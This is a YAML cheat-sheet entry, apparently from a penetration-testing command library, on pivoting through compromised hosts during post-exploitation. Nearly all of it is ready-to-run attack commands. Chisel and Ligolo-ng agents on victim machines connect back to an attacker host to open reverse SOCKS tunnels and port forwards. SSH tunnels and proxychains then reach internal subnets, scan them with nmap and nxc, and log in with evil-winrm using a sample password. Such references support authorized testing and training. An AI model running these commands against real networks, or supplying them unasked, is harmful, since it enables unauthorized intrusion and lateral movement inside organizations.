---
description: |
  Pivot through compromised hosts using Chisel, Ligolo-ng, SSH tunneling, and proxychains to reach internal networks and forward ports.
command: |
  # --- Chisel — Reverse SOCKS Proxy ---
  chisel server -p 8000 --reverse
  ./chisel client 10.10.10.21:8000 R:socks
  chisel.exe client 10.10.10.21:8000 R:socks

  # Chisel single port forward
  ./chisel client 10.10.10.21:8000 R:3306:127.0.0.1:3306

  # Chisel forward to internal host
  ./chisel client 10.10.10.21:8000 R:8080:172.16.0.10:80

  # --- Ligolo-ng — Full Tunnel ---
  sudo ip tuntap add user $(whoami) mode tun ligolo
  sudo ip link set ligolo up
  ./proxy -selfcert -laddr 0.0.0.0:11601
  ./agent -connect 10.10.10.21:11601 -ignore-cert
  agent.exe -connect 10.10.10.21:11601 -ignore-cert
  # In proxy console:
  >> session
  >> start
  sudo ip route add 172.16.0.0/24 dev ligolo
  >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

  # --- SSH Tunneling ---
  # Local port forward (add -N -f to background)
  ssh -L 8080:127.0.0.1:80 sec_user@10.10.10.27

  # Dynamic SOCKS proxy
  ssh -D 1080 -N -f sec_user@10.10.10.27

  # Remote port forward
  ssh -R 4444:localhost:4444 sec_user@10.10.10.27

  # --- Proxychains (needed for Chisel SOCKS + SSH Dynamic) ---
  # Add to /etc/proxychains4.conf:
  socks5 127.0.0.1 1080
  # Ligolo-ng does NOT need proxychains — uses real tun interface

  proxychains4 nmap -sT -Pn -p 22,80,445,3389 172.16.0.10
  proxychains4 nxc smb 172.16.0.0/24
  proxychains4 evil-winrm -i 172.16.0.10 -u sec_user -p 'P@ssw0rd'

  # --- sshuttle (VPN over SSH) ---
  sshuttle -r sec_user@10.10.10.27 172.16.0.0/24
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://github.com/jpillora/chisel
  - https://github.com/nicocha30/ligolo-ng
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
---
